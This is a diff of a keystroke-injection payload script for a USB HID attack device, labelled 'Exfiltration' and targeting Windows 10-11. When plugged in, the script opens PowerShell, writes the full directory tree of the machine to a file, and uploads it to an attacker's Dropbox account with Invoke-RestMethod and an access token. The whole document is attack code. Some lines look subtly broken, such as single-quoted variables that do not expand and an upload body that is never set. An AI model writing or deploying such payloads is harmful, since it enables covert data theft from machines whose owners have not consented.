@@ -1,15 +1,21 @@
-* ###########################################################
-* #                                                         |
-* # Title        : Tree Structure Of The Operating System   |
-* # Author       : Aleff                                    |
-* # Version      : 1.0                                      |
-* # Category     : Exfiltration                             |
-* # Target       : Windows 10-11                            |
-* #                                                         |
-* ###########################################################
+###########################################################
+#                                                         |
+# Title        : Tree Structure Of The Operating System   |
+# Author       : Aleff                                    |
+# Version      : 1.0                                      |
+# Category     : Exfiltration                             |
+# Target       : Windows 10-11                            |
+#                                                         |
+###########################################################
 
-* Requi*ents:
-*     - Internet connection
+ATTACKMODE HID
+
+# REQUIREMENTS
+# - Internet connection
+
+# VARIABLES
+# Set your Dropbox access token
+DROPBOX_ACCESS_TOKEN='example'
 
 QUACK GUI r
 QUACK DELAY 1000
@@ -17,32 +23,39 @@ QUACK STRING PowerShell
 QUACK ENTER
 QUACK DELAY 1000
 
-* Setting about exfiltration
+# Setting about exfiltration
 QUACK STRING tree /f /a > out.txt
 QUACK ENTER
-QUACK STRING $filePath=".\out.txt";
+QUACK DELAY 500
+QUACK STRING $filePath='./out.txt';
 QUACK ENTER
-
-* Set yout Dropbox access token
-QUACK STRING $accessToken="#DROPBOX_ACCESS_TOKEN"
+QUACK DELAY 500
+QUACK STRING $accessToken='$DROPBOX_ACCESS_TOKEN'
 QUACK ENTER
-QUACK STRING $authHeader = @{Authorization = "Bearer $accessToken"}
+QUACK DELAY 500
+QUACK STRING $authHeader=@{Authorization = 'Bearer $accessToken'}
 QUACK ENTER
-QUACK STRING $dropboxFilePath = "/out_exported.txt"
+QUACK DELAY 500
+QUACK STRING $dropboxFilePath='/out_exported.txt'
 QUACK ENTER
-
-QUACK STRING $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
+QUACK DELAY 500
+QUACK STRING $uploadUrl='https://content.dropboxapi.com/2/files/upload'
 QUACK ENTER
-
+QUACK DELAY 500
 QUACK STRING $headers = @{}
 QUACK ENTER
-QUACK STRING $headers.Add("Authorization", "Bearer $accessToken")
+QUACK DELAY 500
+QUACK STRING $headers.Add('Authorization', 'Bearer $accessToken')
 QUACK ENTER
-QUACK STRING $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
+QUACK DELAY 500
+QUACK STRING $headers.Add('Dropbox-API-Arg', '{\"path\":\"' + $dropboxFilePath + '\",\"mode\":\"add\",\"autorename\":true,\"mute\":false}')
 QUACK ENTER
-QUACK STRING $headers.Add("Content-Type", "application/octet-stream")
+QUACK DELAY 500
+QUACK STRING $headers.Add('Content-Type', 'application/octet-stream')
 QUACK ENTER
+QUACK DELAY 500
 QUACK STRING Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body 
 QUACK ENTER
+QUACK DELAY 500
 QUACK STRING $fileContent; exit;
 QUACK ENTER
